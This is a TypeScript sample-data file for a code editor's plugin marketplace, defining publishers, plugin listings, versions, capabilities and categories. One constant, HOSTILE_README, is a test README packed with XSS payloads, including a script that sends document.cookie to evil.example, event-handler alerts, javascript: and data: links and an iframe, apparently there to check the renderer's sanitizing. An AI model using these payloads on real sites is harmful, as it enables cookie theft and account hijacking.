export interface SampleVersion {
  readonly version: string;
  readonly state: "review" | "held" | "published" | "yanked" | "frozen" | "blocked" | "deleted";
  readonly daysAgo: number;
  readonly reviewed: boolean;
  readonly api?: string;
  readonly notes?: string;
  readonly readme?: string;
  readonly yankReason?: string;
}

export interface SamplePlugin {
  readonly id: string;
  readonly name: string;
  readonly tier: "official" | "verified" | "unverified";
  readonly state: "listed" | "deprecated" | "frozen" | "blocked" | "deleted";
  readonly icon: string;
  readonly banner?: boolean;
  readonly gallery?: readonly string[];
  readonly categories: readonly string[];
  readonly keywords: readonly string[];
  readonly summary: string;
  readonly license: string;
  readonly capabilities: readonly { readonly id: string; readonly reason: string }[];
  readonly hosts?: readonly string[];
  readonly platforms?: readonly string[];
  readonly dependencies?: readonly { readonly id: string; readonly range: string }[];
  readonly deprecated?: { readonly reason: string; readonly replacement?: string };
  readonly languages?: readonly string[];
  readonly languagePack?: { readonly language: string; readonly name: string; readonly englishName: string; readonly targets: readonly string[] };
  readonly installs: number;
  readonly versions: readonly SampleVersion[];
}

export interface SamplePublisher {
  readonly name: string;
  readonly displayName: string;
  readonly login: string;
  readonly type: "User" | "Organization";
  readonly state: "active" | "suspended" | "blocked";
  readonly verified: boolean;
}

export const API = ">=0.1.0 <0.2.0";

export const PUBLISHERS: readonly SamplePublisher[] = [
  { name: "runesmith", displayName: "Runesmith", login: "RunesmithHub", type: "Organization", state: "active", verified: true },
  { name: "harbor", displayName: "Harbor Collective", login: "harbor-collective", type: "Organization", state: "active", verified: true },
  { name: "northwind", displayName: "Northwind Tools", login: "northwind-tools", type: "Organization", state: "active", verified: true },
  { name: "ember", displayName: "Ember Studio", login: "ember-studio", type: "Organization", state: "active", verified: true },
  { name: "tide", displayName: "Tide Labs", login: "tide-labs", type: "Organization", state: "active", verified: true },
  { name: "lumen", displayName: "Lumen Labs", login: "lumen-labs", type: "Organization", state: "active", verified: false },
  { name: "atlas", displayName: "Atlas Dev", login: "atlas-dev", type: "User", state: "active", verified: false },
  { name: "cobalt", displayName: "cobalt-oss", login: "cobalt-oss", type: "Organization", state: "active", verified: false },
  { name: "pixel", displayName: "pixelkit", login: "pixelkit", type: "User", state: "active", verified: false },
  { name: "copper", displayName: "Copper", login: "copper-dev", type: "User", state: "suspended", verified: false },
  { name: "fastcode", displayName: "fastcode", login: "fastcode", type: "User", state: "active", verified: false },
];

export const HOSTILE_README = `# Lumen Todo

Collects **TODO** comments. See [the docs](docs/usage.md) or [our site](https://lumen.example).

<script>fetch('https://evil.example/?c=' + document.cookie)</script>

<img src="x" onerror="alert(1)">

[Click me](javascript:alert(document.domain))

[Data link](data:text/html,<script>alert(1)</script>)

![Tracking pixel](https://tracker.example/pixel.png?u=visitor)

<svg onload="alert(1)"><circle r="5"/></svg>

<iframe src="https://evil.example/frame"></iframe>

<a href="https://evil.example" onclick="alert(1)">raw anchor</a>

| Feature | Status |
| --- | --- |
| Grouping | Done |

\`\`\`csharp
var todo = new Todo("Fix the parser");
\`\`\`

Contact: [mail us](mailto:hello@lumen.example)
`;

const HARBOR_README = `# Harbor Issues

Links commits, branches and TODO comments to issues in GitHub, Forgejo and Gitea.

## Getting started

1. Install Harbor Issues from the hub.
2. Open a project that has a remote on a supported tracker.
3. Sign in from **Settings > Harbor Issues**. The token stays in your system's secure storage.

## Features

- Shows the issue for the current branch in the status bar.
- Turns \`#123\` in commit messages into links.
- Lists TODO comments that mention an issue.

| Tracker | Issues | Pull requests |
| --- | --- | --- |
| GitHub | Yes | Yes |
| Forgejo | Yes | Yes |
| Gitea | Yes | No |

See [the changelog](CHANGELOG.md) for what changed.

![The issue panel](docs/panel.png)
`;

export const PLUGINS: readonly SamplePlugin[] = [
  {
    id: "runesmith.csharp", name: "C#", tier: "official", state: "listed", icon: "runesmith", categories: ["Languages"],
    keywords: ["csharp", "dotnet", "roslyn"], license: "Apache-2.0", installs: 48210,
    summary: "C# editing with completion, diagnostics, navigation, refactorings and the .NET build.",
    capabilities: [
      { id: "process", reason: "Runs the .NET SDK to build, test and restore projects." },
      { id: "network", reason: "Downloads .NET SDKs when you ask it to." },
    ],
    hosts: ["dotnetcli.azureedge.net", "builds.dotnet.microsoft.com"],
    versions: [
      { version: "0.1.6", state: "published", daysAgo: 7, reviewed: true, api: ">=0.1.1 <0.2.0", notes: "Faster completion in large solutions." },
      { version: "0.1.5", state: "published", daysAgo: 21, reviewed: true },
    ],
  },
  {
    id: "runesmith.git", name: "Git", tier: "official", state: "listed", icon: "runesmith", categories: ["Version control"],
    keywords: ["git", "vcs"], license: "Apache-2.0", installs: 51930,
    summary: "Commit, branch, fetch, history and diffs for Git repositories.",
    capabilities: [{ id: "process", reason: "Runs git for operations the library does not cover." }],
    languages: ["en", "nl", "de"],
    versions: [
      { version: "0.3.4", state: "published", daysAgo: 11, reviewed: true },
      { version: "0.3.3", state: "published", daysAgo: 38, reviewed: true },
      { version: "0.3.0", state: "published", daysAgo: 87, reviewed: true },
    ],
  },
  {
    id: "runesmith.github", name: "GitHub", tier: "official", state: "listed", icon: "runesmith", categories: ["Version control", "Cloud and remote"],
    keywords: ["github", "clone"], license: "Apache-2.0", installs: 30110,
    summary: "Sign in with GitHub, clone your repositories and add organizations.",
    capabilities: [
      { id: "network", reason: "Talks to GitHub's API to list and clone your repositories." },
      { id: "credentials", reason: "Keeps your GitHub sign-in in your system's secure storage." },
    ],
    hosts: ["github.com", "api.github.com"], dependencies: [{ id: "runesmith.git", range: ">=0.3.0 <0.4.0" }],
    versions: [{ version: "0.2.1", state: "published", daysAgo: 5, reviewed: true }],
  },
  {
    id: "runesmith.dutch", name: "Dutch Language Pack", tier: "official", state: "listed", icon: "runesmith", categories: ["Other"],
    keywords: ["dutch", "nederlands"], license: "Apache-2.0", installs: 6120,
    summary: "Runesmith and its GitHub plugin in Dutch.", capabilities: [],
    languagePack: { language: "nl", name: "Nederlands", englishName: "Dutch", targets: ["runesmith", "runesmith.github"] },
    versions: [{ version: "0.1.0", state: "published", daysAgo: 6, reviewed: true }],
  },
  {
    id: "harbor.issues", name: "Harbor Issues", tier: "verified", state: "listed", icon: "harbor.issues", banner: true,
    gallery: ["harbor.issues", "northwind.charts"], categories: ["Productivity", "Version control"], keywords: ["issues", "github", "forgejo", "gitea"],
    license: "Apache-2.0", installs: 8420, summary: "Links commits, branches and TODOs to issues in GitHub, Forgejo and Gitea.",
    capabilities: [
      { id: "network", reason: "Reads issues from your issue tracker." },
      { id: "credentials", reason: "Keeps the access token for your issue tracker." },
    ],
    hosts: ["api.github.com", "codeberg.org"], dependencies: [{ id: "runesmith.git", range: ">=0.3.0 <0.4.0" }],
    versions: [
      { version: "1.4.0", state: "review", daysAgo: 1, reviewed: false, notes: "Adds Gitea support." },
      { version: "1.3.2", state: "published", daysAgo: 9, reviewed: true, notes: "Fixes the token refresh for Forgejo.", readme: HARBOR_README },
      { version: "1.3.1", state: "published", daysAgo: 12, reviewed: true },
      { version: "1.3.0", state: "published", daysAgo: 37, reviewed: true },
      { version: "1.2.0", state: "published", daysAgo: 60, reviewed: true },
    ],
  },
  {
    id: "northwind.charts", name: "Northwind Charts", tier: "verified", state: "listed", icon: "northwind.charts", banner: true,
    gallery: ["northwind.charts"], categories: ["Visualization", "Data and databases"], keywords: ["csv", "json", "charts"],
    license: "MIT", installs: 5120, summary: "Preview CSV and JSON files as charts beside the editor.", capabilities: [],
    platforms: ["windows", "linux"],
    versions: [
      { version: "2.1.0", state: "published", daysAgo: 27, reviewed: true },
      { version: "2.0.0", state: "published", daysAgo: 69, reviewed: true },
      { version: "2.2.0-beta.1", state: "published", daysAgo: 3, reviewed: true, notes: "Pie charts, as a preview." },
    ],
  },
  {
    id: "ember.themes", name: "Ember Themes", tier: "verified", state: "listed", icon: "ember.themes", banner: true,
    categories: ["Themes"], keywords: ["theme", "dark", "light"], license: "MIT", installs: 12700,
    summary: "Six warm dark themes and two light ones, tuned for long sessions.", capabilities: [],
    versions: [{ version: "3.0.1", state: "published", daysAgo: 48, reviewed: true }],
  },
  {
    id: "tide.formatter", name: "Tide Formatter", tier: "verified", state: "listed", icon: "tide.formatter", banner: true,
    categories: ["Formatters and linters"], keywords: ["format", "dotnet-format"], license: "MIT", installs: 9340,
    summary: "Formats on save with the formatter your project already uses.",
    capabilities: [{ id: "process", reason: "Runs your project's formatter, such as dotnet format." }],
    versions: [{ version: "1.8.0", state: "published", daysAgo: 14, reviewed: true, api: ">=0.1.1 <0.2.0" }],
  },
  {
    id: "lumen.todo", name: "Lumen Todo", tier: "unverified", state: "listed", icon: "lumen.todo", gallery: ["lumen.todo"],
    categories: ["Productivity"], keywords: ["todo", "comments"], license: "MIT", installs: 2210,
    summary: "Collects TODO comments across your project and links them to issues.", capabilities: [],
    dependencies: [{ id: "harbor.issues", range: ">=1.2.0 <2.0.0" }, { id: "runesmith.git", range: ">=0.3.1 <0.4.0" }],
    versions: [
      { version: "1.1.0", state: "held", daysAgo: 0, reviewed: false, notes: "Groups TODOs by author." },
      { version: "1.0.0", state: "published", daysAgo: 3, reviewed: false, notes: "First stable release.", readme: HOSTILE_README },
      { version: "0.9.2", state: "yanked", daysAgo: 19, reviewed: false, notes: "Withdrawn: crashed on empty files.", yankReason: "Crashed on empty files." },
    ],
  },
  {
    id: "atlas.rest", name: "Atlas REST Client", tier: "unverified", state: "listed", icon: "atlas.rest",
    categories: ["Cloud and remote", "Testing"], keywords: ["http", "rest", "api"], license: "GPL-3.0-only", installs: 3460,
    summary: "Send HTTP requests from .http files and see responses side by side.",
    capabilities: [
      { id: "network", reason: "Sends the HTTP requests you write to the servers you name." },
      { id: "filesystem", reason: "Saves response bodies where you choose." },
    ],
    hosts: ["*"],
    versions: [
      { version: "0.7.0", state: "published", daysAgo: 4, reviewed: false, api: ">=0.2.0 <0.3.0", notes: "Needs plugin API 0.2." },
      { version: "0.6.0", state: "published", daysAgo: 10, reviewed: false },
    ],
  },
  {
    id: "cobalt.docker", name: "Cobalt Docker", tier: "unverified", state: "listed", icon: "cobalt.docker",
    categories: ["Build and run", "Cloud and remote"], keywords: ["docker", "containers"], license: "MIT", installs: 1890,
    summary: "Build, run and inspect containers from the editor.",
    capabilities: [
      { id: "process", reason: "Runs the docker command line." },
      { id: "environment", reason: "Reads DOCKER_HOST to find your container engine." },
    ],
    platforms: ["linux", "macos"],
    versions: [{ version: "0.3.2", state: "published", daysAgo: 31, reviewed: false }],
  },
  {
    id: "pixel.icons", name: "Pixel File Icons", tier: "unverified", state: "listed", icon: "pixel.icons",
    categories: ["Themes"], keywords: ["icons", "pixel"], license: "MIT", installs: 4020,
    summary: "Crisp pixel-art icons for 400 file types.", capabilities: [],
    versions: [
      { version: "2.2.0", state: "published", daysAgo: 2, reviewed: false },
      { version: "2.1.3", state: "published", daysAgo: 24, reviewed: false },
    ],
  },
  {
    id: "copper.snippets", name: "Copper Snippets", tier: "unverified", state: "deprecated", icon: "copper.snippets",
    categories: ["Snippets and templates"], keywords: ["snippets"], license: "MIT", installs: 2750,
    summary: "Snippets for C# and Java.", capabilities: [],
    deprecated: { reason: "No longer maintained.", replacement: "runesmith.csharp" },
    versions: [{ version: "1.2.0", state: "published", daysAgo: 160, reviewed: false }],
  },
  {
    id: "copper.markdown", name: "Copper Markdown", tier: "unverified", state: "deleted", icon: "copper.snippets",
    categories: ["Documentation"], keywords: ["markdown"], license: "MIT", installs: 120,
    summary: "Markdown preview.", capabilities: [],
    versions: [{ version: "0.4.0", state: "deleted", daysAgo: 200, reviewed: false }],
  },
  {
    id: "fastcode.helper", name: "FastCode Helper", tier: "unverified", state: "listed", icon: "fastcode.helper",
    categories: ["Productivity"], keywords: ["fast"], license: "MIT", installs: 0,
    summary: "Speeds up your editing.", capabilities: [{ id: "network", reason: "Checks for updates." }], hosts: ["fastcode.example"],
    versions: [{ version: "1.0.1", state: "published", daysAgo: 20, reviewed: false }],
  },
];

export const FEATURED = ["harbor.issues", "northwind.charts", "ember.themes"];

export const CATEGORIES = [
  "Languages", "Version control", "Themes", "Formatters and linters", "Debugging", "Testing", "Build and run",
  "Snippets and templates", "Navigation", "Productivity", "Visualization", "Cloud and remote", "Data and databases",
  "Documentation", "Education", "Other",
];

export const CAPABILITY_LABELS: Readonly<Record<string, string>> = {
  network: "Connects to the internet or other computers",
  process: "Starts other programs",
  filesystem: "Reads or writes files outside your project",
  environment: "Reads environment variables or system settings",
  credentials: "Stores or reads passwords and tokens",
  native: "Runs native code",
  "dynamic-code": "Loads or generates code while running",
};
